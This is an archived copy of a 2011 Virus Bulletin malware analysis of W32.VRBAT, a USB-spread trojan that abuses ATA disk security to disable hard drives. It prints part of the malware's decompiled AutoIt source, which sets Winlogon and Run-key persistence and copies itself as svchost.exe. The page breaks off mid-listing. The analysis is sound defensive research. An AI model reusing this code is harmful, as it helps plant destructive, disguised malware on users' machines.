<?xml version="1.0"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title>Jorge Lodos, Jesús Villabrille, Edgar Guadis 'Hard Disk Woes' (VX heaven)</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<meta name="Author" content="Jorge Lodos, Jesús Villabrille, Edgar Guadis"/>
<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, Lodos, Jorge; Villabrille, Jesús; Guadis, Edgar,Hard Disk Woes, disk, reco, autorun, user, hard, security, software, grub, password, filesetattrib, rshв, commands, windowsdir, command, specification"/>
<meta name="Description" content="It is uncommon these days to find malware whose sole purpose is to cause damage, but W32.VRBAT does just that (and only that) В– using ATA disk security to render hard disks useless. Jorge Lordos and colleagues have the details."/>
<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"d9f501f31fb517b1a1a9654848d4797150a83ba1-1498756371-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
//]]>
</script>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/ajl01.html"/>
<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
</head>
<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
<div class="s1">
<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
<div style="float: right;"><div id="plusone"></div></div>
<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
<div style="float: right;" class="addthis_toolbox addthis_default_style">
<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
</div>
<div style="float: right;">
<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
<form action="/search.php" id="cse-search-box">
<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
<input type="hidden" name="cof" value="FORID:10"/>
<input type="hidden" name="ie" value="UTF-8"/>
<input type="text" name="q" size="12" value=" "/>
<input type="submit" name="sa" value="Search"/>
</form>
</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
</div>
<div class="s2"><h1>Hard Disk Woes</h1><p><a href="/lib/?lang=en&amp;author=Lodos%2C%20Jorge">Jorge Lodos</a>, <a href="/lib/?lang=en&amp;author=Villabrille%2C%20Jes%C3%BAs">Jesús Villabrille</a>, <a href="/lib/?lang=en&amp;author=Guadis%2C%20Edgar">Edgar Guadis</a><br/> <em>Virus Bulletin, October 2011, pp. 8-11</em><br/> <em>ISSN 0956-9979</em><br/> <em>October 2011</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/ajl01.html';</script>[<a style="" href="/lib/?lang=EN&amp;index=AN#ajl01">Back to index</a>] [<a href="/lib/ajl01.html#disqus_thread">Comments</a>]<br/> <form method="post" action=""><input type="hidden" name="pages" value="1"/><input type="submit" value="Turn on page numbers"/></form>
<ul>
<li><a href="#c0">ATA protocol</a></li>
<li><a href="#c1">W32.VRBAT trojan</a></li>
<li><a href="#c2">Payload</a></li>
<li><a href="#c3">Recovery</a></li>
<li><a href="#c4">Conclusion</a></li>
<li><a href="#c5">References</a></li>
</ul>
<p>In the first week of August, Segurmatica support services started to receive a number of strange reports. In distant locations of the same Cuban province, dozens of hard disks suddenly failed within a few days. Malware activity was suspected, but there were no previous examples of malware causing hardware disk failure, and all isolated samples were apparently unrelated. However, a pattern soon emerged, and a file called USBCheck.exe was found to be present on many of the USB sticks that had been used on the damaged computers. A thorough analysis of this file followed, resulting in the discovery of a piece of malware that is novel not only because of its effect, but also because of the way in which it achieves it. What follows is a complete description of the malware В– the components of which we have named W32.VRBAT.</p>
<h2><a name="c0"></a>ATA protocol</h2>
<p>The ATA specification is well known<sup><a href="#f1_1" name="b1_1">1</a></sup>. All SATA and IDE disks implement this specification in order to interoperate. The ATA commands<sup><a href="#f1_2" name="b1_2">2</a></sup> are part of this specification. They allow a low level communication with disk firmware. A subset of these commands, unified under the classification security, allow the setting of security in the hard disk. The disk can be password protected and unprotected using a previously set password. Interestingly, the disk can also be prevented from receiving other security commands. In modern versions of Windows, including XP SP3 and Vista, one of the first things that the operating system does is to issue the FREEZE LOCK security command, effectively preventing any other security command from being sent to the hard drive until the next cold boot. This useful security measure prevents unauthorized applications В– such as malware В– from password protecting the disk. Unfortunately, this protection can be circumvented.</p>
<h2><a name="c1"></a>W32.VRBAT trojan</h2>
<p>USBCheck.exe is a 465KB PE file. It runs from memory sticks in unpatched Windows systems using the unoriginal and now obsolete autorun.inf. It is a UPX packed self-executing AutoIt script which also contains a few other files used by the script. The actual malware code can be obtained fairly easily (Figure 1).</p>
<div class="autoit" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #F000FF; font-style: italic;">#NoTrayIcon</span><br/>
<a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/functions/Opt.htm"><span style="color: #000080; font-style: italic; font-weight: bold;">Opt</span></a><span style="color: black;">&#40;</span>В“TrayIconHideВ”<span style="color: #FF0000; font-weight: bold;">,</span> <span style="color: #AC00A9; font-style: italic; font-weight: bold;">1</span><span style="color: black;">&#41;</span><br/>
<span style="font-weight: bold; color: #AA0000;">$PARAM</span> <span style="color: #FF0000; font-weight: bold;">=</span> В“В”<br/>
<a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/keywords.htm"><span style="color: #0000FF; font-weight: bold;">If</span></a> <span style="font-weight: bold; color: #AA0000;">$CMDLINE</span><span style="color: black;">&#91;</span><span style="color: #AC00A9; font-style: italic; font-weight: bold;">0</span><span style="color: black;">&#93;</span> <span style="color: #FF0000; font-weight: bold;">&gt;</span> <span style="color: #AC00A9; font-style: italic; font-weight: bold;">0</span> <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/keywords.htm"><span style="color: #0000FF; font-weight: bold;">Then</span></a> <span style="font-weight: bold; color: #AA0000;">$PARAM</span> <span style="color: #FF0000; font-weight: bold;">=</span> <span style="font-weight: bold; color: #AA0000;">$CMDLINE</span><span style="color: black;">&#91;</span><span style="color: #AC00A9; font-style: italic; font-weight: bold;">1</span><span style="color: black;">&#93;</span><br/>
<a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/keywords.htm"><span style="color: #0000FF; font-weight: bold;">If</span></a> <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/macros.htm"><span style="color: #800000; font-weight: bold;"><span style="font-weight: bold; color: #AA0000;">@ScriptDir</span></span></a> <span style="color: #FF0000; font-weight: bold;">=</span> <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/macros.htm"><span style="color: #800000; font-weight: bold;"><span style="font-weight: bold; color: #AA0000;">@WindowsDir</span></span></a> <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/keywords.htm"><span style="color: #0000FF; font-weight: bold;">Then</span></a><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/functions/RegWrite.htm"><span style="color: #000080; font-style: italic; font-weight: bold;">RegWrite</span></a><span style="color: black;">&#40;</span>В“HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinlogonВ”<span style="color: #FF0000; font-weight: bold;">,</span> В“shellВ”<span style="color: #FF0000; font-weight: bold;">,</span>В“REG_SZВ”<span style="color: #FF0000; font-weight: bold;">,</span> В“explorer<span style="color: #FF0000; font-weight: bold;">.</span><span style="color: #0000FF; font-style: italic; font-weight: bold;">exe</span> В“ <span style="color: #FF0000; font-weight: bold;">&amp;</span> <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/macros.htm"><span style="color: #800000; font-weight: bold;"><span style="font-weight: bold; color: #AA0000;">@ScriptFullPath</span></span></a> <span style="color: #FF0000; font-weight: bold;">&amp;</span> В“ В“ <span style="color: #FF0000; font-weight: bold;">&amp;</span><span style="font-weight: bold; color: #AA0000;">$PARAM</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="font-weight: bold; color: #AA0000;">$RR</span> <span style="color: #FF0000; font-weight: bold;">=</span> <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/functions/RegRead.htm"><span style="color: #000080; font-style: italic; font-weight: bold;">RegRead</span></a><span style="color: black;">&#40;</span>В“HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Alfa1В”<span style="color: #FF0000; font-weight: bold;">,</span> В“tВ”<span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/keywords.htm"><span style="color: #0000FF; font-weight: bold;">If</span></a> <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/macros.htm"><span style="color: #800000; font-weight: bold;"><span style="font-weight: bold; color: #AA0000;">@error</span></span></a> <span style="color: #FF0000; font-weight: bold;">=</span> <span style="color: #AC00A9; font-style: italic; font-weight: bold;">0</span> <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/keywords.htm"><span style="color: #0000FF; font-weight: bold;">Then</span></a><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/keywords.htm"><span style="color: #0000FF; font-weight: bold;">If</span></a> <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/functions/StringLeft.htm"><span style="color: #000080; font-style: italic; font-weight: bold;">StringLeft</span></a><span style="color: black;">&#40;</span><span style="font-weight: bold; color: #AA0000;">$RR</span><span style="color: #FF0000; font-weight: bold;">,</span> <span style="color: #AC00A9; font-style: italic; font-weight: bold;">8</span><span style="color: black;">&#41;</span> <span style="color: #FF0000; font-weight: bold;">&lt;&gt;</span> <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/macros.htm"><span style="color: #800000; font-weight: bold;"><span style="font-weight: bold; color: #AA0000;">@YEAR</span></span></a> <span style="color: #FF0000; font-weight: bold;">&amp;</span> <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/macros.htm"><span style="color: #800000; font-weight: bold;"><span style="font-weight: bold; color: #AA0000;">@MON</span></span></a> <span style="color: #FF0000; font-weight: bold;">&amp;</span> <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/macros.htm"><span style="color: #800000; font-weight: bold;"><span style="font-weight: bold; color: #AA0000;">@MDAY</span></span></a> <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/keywords.htm"><span style="color: #0000FF; font-weight: bold;">Then</span></a><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/keywords.htm"><span style="color: #0000FF; font-weight: bold;">If</span></a> <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/functions/Number.htm"><span style="color: #000080; font-style: italic; font-weight: bold;">Number</span></a><span style="color: black;">&#40;</span><a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/functions/StringRight.htm"><span style="color: #000080; font-style: italic; font-weight: bold;">StringRight</span></a><span style="color: black;">&#40;</span><span style="font-weight: bold; color: #AA0000;">$RR</span><span style="color: #FF0000; font-weight: bold;">,</span> <span style="color: #AC00A9; font-style: italic; font-weight: bold;">1</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> <span style="color: #FF0000; font-weight: bold;">&gt;</span> <span style="color: #AC00A9; font-style: italic; font-weight: bold;">6</span> <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/keywords.htm"><span style="color: #0000FF; font-weight: bold;">Then</span></a><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/keywords.htm"><span style="color: #0000FF; font-weight: bold;">If</span></a> <span style="font-weight: bold; color: #AA0000;">$PARAM</span> <span style="color: #FF0000; font-weight: bold;">&lt;&gt;</span> В“<span style="color: #FF0000; font-weight: bold;">-</span>aВ” <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/keywords.htm"><span style="color: #0000FF; font-weight: bold;">Then</span></a> INST<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/keywords.htm"><span style="color: #0000FF; font-weight: bold;">Else</span></a><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="font-weight: bold; color: #AA0000;">$T</span> <span style="color: #FF0000; font-weight: bold;">=</span> <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/functions/Number.htm"><span style="color: #000080; font-style: italic; font-weight: bold;">Number</span></a><span style="color: black;">&#40;</span><a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/functions/StringRight.htm"><span style="color: #000080; font-style: italic; font-weight: bold;">StringRight</span></a><span style="color: black;">&#40;</span><span style="font-weight: bold; color: #AA0000;">$RR</span><span style="color: #FF0000; font-weight: bold;">,</span> <span style="color: #AC00A9; font-style: italic; font-weight: bold;">1</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> <span style="color: #FF0000; font-weight: bold;">+</span> <span style="color: #AC00A9; font-style: italic; font-weight: bold;">1</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="font-weight: bold; color: #AA0000;">$T</span> <span style="color: #FF0000; font-weight: bold;">=</span> <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/macros.htm"><span style="color: #800000; font-weight: bold;"><span style="font-weight: bold; color: #AA0000;">@YEAR</span></span></a> <span style="color: #FF0000; font-weight: bold;">&amp;</span> <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/macros.htm"><span style="color: #800000; font-weight: bold;"><span style="font-weight: bold; color: #AA0000;">@MON</span></span></a> <span style="color: #FF0000; font-weight: bold;">&amp;</span> <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/macros.htm"><span style="color: #800000; font-weight: bold;"><span style="font-weight: bold; color: #AA0000;">@MDAY</span></span></a> <span style="color: #FF0000; font-weight: bold;">&amp;</span> В“<span style="color: #FF0000; font-weight: bold;">-</span>В” <span style="color: #FF0000; font-weight: bold;">&amp;</span> <span style="font-weight: bold; color: #AA0000;">$T</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/functions/RegWrite.htm"><span style="color: #000080; font-style: italic; font-weight: bold;">RegWrite</span></a><span style="color: black;">&#40;</span>В“HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Alfa1В”<span style="color: #FF0000; font-weight: bold;">,</span> В“tВ”<span style="color: #FF0000; font-weight: bold;">,</span>В“REG_SZВ”<span style="color: #FF0000; font-weight: bold;">,</span> <span style="font-weight: bold; color: #AA0000;">$T</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/keywords.htm"><span style="color: #0000FF; font-weight: bold;">EndIf</span></a><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/keywords.htm"><span style="color: #0000FF; font-weight: bold;">EndIf</span></a><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; CICLE1<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/keywords.htm"><span style="color: #0000FF; font-weight: bold;">Else</span></a><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="font-weight: bold; color: #AA0000;">$T</span> <span style="color: #FF0000; font-weight: bold;">=</span> <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/macros.htm"><span style="color: #800000; font-weight: bold;"><span style="font-weight: bold; color: #AA0000;">@YEAR</span></span></a> <span style="color: #FF0000; font-weight: bold;">&amp;</span> <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/macros.htm"><span style="color: #800000; font-weight: bold;"><span style="font-weight: bold; color: #AA0000;">@MON</span></span></a> <span style="color: #FF0000; font-weight: bold;">&amp;</span> <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/macros.htm"><span style="color: #800000; font-weight: bold;"><span style="font-weight: bold; color: #AA0000;">@MDAY</span></span></a> <span style="color: #FF0000; font-weight: bold;">&amp;</span> В“<span style="color: #FF0000; font-weight: bold;">-</span><span style="color: #AC00A9; font-style: italic; font-weight: bold;">1</span>В”<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/functions/RegWrite.htm"><span style="color: #000080; font-style: italic; font-weight: bold;">RegWrite</span></a><span style="color: black;">&#40;</span>В“HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Alfa1В”<span style="color: #FF0000; font-weight: bold;">,</span> В“tВ”<span style="color: #FF0000; font-weight: bold;">,</span>В“REG_SZВ”<span style="color: #FF0000; font-weight: bold;">,</span> <span style="font-weight: bold; color: #AA0000;">$T</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; CICLE1<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/keywords.htm"><span style="color: #0000FF; font-weight: bold;">EndIf</span></a><br/>
<a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/keywords.htm"><span style="color: #0000FF; font-weight: bold;">ElseIf</span></a> <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/macros.htm"><span style="color: #800000; font-weight: bold;"><span style="font-weight: bold; color: #AA0000;">@ScriptDir</span></span></a> <span style="color: #FF0000; font-weight: bold;">=</span> <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/macros.htm"><span style="color: #800000; font-weight: bold;"><span style="font-weight: bold; color: #AA0000;">@TempDir</span></span></a> <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/keywords.htm"><span style="color: #0000FF; font-weight: bold;">Then</span></a><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/keywords.htm"><span style="color: #0000FF; font-weight: bold;">If</span></a> <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/functions/IsAdmin.htm"><span style="color: #000080; font-style: italic; font-weight: bold;">IsAdmin</span></a><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span> <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/keywords.htm"><span style="color: #0000FF; font-weight: bold;">Then</span></a><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/functions/RegDelete.htm"><span style="color: #000080; font-style: italic; font-weight: bold;">RegDelete</span></a><span style="color: black;">&#40;</span>В“HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\<a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/functions/Run.htm"><span style="color: #000080; font-style: italic; font-weight: bold;">Run</span></a>В”<span style="color: #FF0000; font-weight: bold;">,</span> В“Sound_filterВ”<span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/functions/FileCopy.htm"><span style="color: #000080; font-style: italic; font-weight: bold;">FileCopy</span></a><span style="color: black;">&#40;</span><a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/macros.htm"><span style="color: #800000; font-weight: bold;"><span style="font-weight: bold; color: #AA0000;">@ScriptFullPath</span></span></a><span style="color: #FF0000; font-weight: bold;">,</span> <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/macros.htm"><span style="color: #800000; font-weight: bold;"><span style="font-weight: bold; color: #AA0000;">@WindowsDir</span></span></a> <span style="color: #FF0000; font-weight: bold;">&amp;</span> В“\svchost<span style="color: #FF0000; font-weight: bold;">.</span><span style="color: #0000FF; font-style: italic; font-weight: bold;">exe</span>В”<span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/functions/Run.htm"><span style="color: #000080; font-style: italic; font-weight: bold;">Run</span></a><span style="color: black;">&#40;</span><a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/macros.htm"><span style="color: #800000; font-weight: bold;"><span style="font-weight: bold; color: #AA0000;">@WindowsDir</span></span></a> <span style="color: #FF0000; font-weight: bold;">&amp;</span> В“\svchost<span style="color: #FF0000; font-weight: bold;">.</span><span style="color: #0000FF; font-style: italic; font-weight: bold;">exe</span> В“ <span style="color: #FF0000; font-weight: bold;">&amp;</span> <span style="font-weight: bold; color: #AA0000;">$PARAM</span><span style="color: #FF0000; font-weight: bold;">,</span> <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/macros.htm"><span style="color: #800000; font-weight: bold;"><span style="font-weight: bold; color: #AA0000;">@WindowsDir</span></span></a><span style="color: #FF0000; font-weight: bold;">,</span> <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/macros.htm"><span style="color: #800000; font-weight: bold;"><span style="font-weight: bold; color: #AA0000;">@SW_HIDE</span></span></a><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/keywords.htm"><span style="color: #0000FF; font-weight: bold;">Else</span></a><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/functions/RegWrite.htm"><span style="color: #000080; font-style: italic; font-weight: bold;">RegWrite</span></a><span style="color: black;">&#40;</span>В“HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\<a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/functions/Run.htm"><span style="color: #000080; font-style: italic; font-weight: bold;">Run</span></a>В”<span style="color: #FF0000; font-weight: bold;">,</span> В“Sound_filterВ”<span style="color: #FF0000; font-weight: bold;">,</span>В“REG_SZВ”<span style="color: #FF0000; font-weight: bold;">,</span> <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/macros.htm"><span style="color: #800000; font-weight: bold;"><span style="font-weight: bold; color: #AA0000;">@ScriptFullPath</span></span></a> <span style="color: #FF0000; font-weight: bold;">&amp;</span> В“ В“ <span style="color: #FF0000; font-weight: bold;">&amp;</span> <span style="font-weight: bold; color: #AA0000;">$PARAM</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; CICLE1<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/keywords.htm"><span style="color: #0000FF; font-weight: bold;">EndIf</span></a><br/>
<a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/keywords.htm"><span style="color: #0000FF; font-weight: bold;">Else</span></a><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/keywords.htm"><span style="color: #0000FF; font-weight: bold;">If</span></a> <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/functions/IsAdmin.htm"><span style="color: #000080; font-style: italic; font-weight: bold;">IsAdmin</span></a><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span> <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/keywords.htm"><span style="color: #0000FF; font-weight: bold;">Then</span></a><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/functions/FileCopy.htm"><span style="color: #000080; font-style: italic; font-weight: bold;">FileCopy</span></a><span style="color: black;">&#40;</span><a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/macros.htm"><span style="color: #800000; font-weight: bold;"><span style="font-weight: bold; color: #AA0000;">@ScriptFullPath</span></span></a><span style="color: #FF0000; font-weight: bold;">,</span> <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/macros.htm"><span style="color: #800000; font-weight: bold;"><span style="font-weight: bold; color: #AA0000;">@WindowsDir</span></span></a> <span style="color: #FF0000; font-weight: bold;">&amp;</span> В“\svchost<span style="color: #FF0000; font-weight: bold;">.</span><span style="color: #0000FF; font-style: italic; font-weight: bold;">exe</span>В”<span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/functions/Run.htm"><span style="color: #000080; font-style: italic; font-weight: bold;">Run</span></a><span style="color: black;">&#40;</span><a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/macros.htm"><span style="color: #800000; font-weight: bold;"><span style="font-weight: bold; color: #AA0000;">@WindowsDir</span></span></a> <span style="color: #FF0000; font-weight: bold;">&amp;</span> В“\svchost<span style="color: #FF0000; font-weight: bold;">.</span><span style="color: #0000FF; font-style: italic; font-weight: bold;">exe</span> В“ <span style="color: #FF0000; font-weight: bold;">&amp;</span> <span style="font-weight: bold; color: #AA0000;">$PARAM</span><span style="color: #FF0000; font-weight: bold;">,</span> <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/macros.htm"><span style="color: #800000; font-weight: bold;"><span style="font-weight: bold; color: #AA0000;">@WindowsDir</span></span></a><span style="color: #FF0000; font-weight: bold;">,</span> <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/macros.htm"><span style="color: #800000; font-weight: bold;"><span style="font-weight: bold; color: #AA0000;">@SW_HIDE</span></span></a><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.autoitscript.com/autoit3/docs/keywords.htm"><span style="color: #0000FF; font-weight: bold;">Else</span></a><br/>
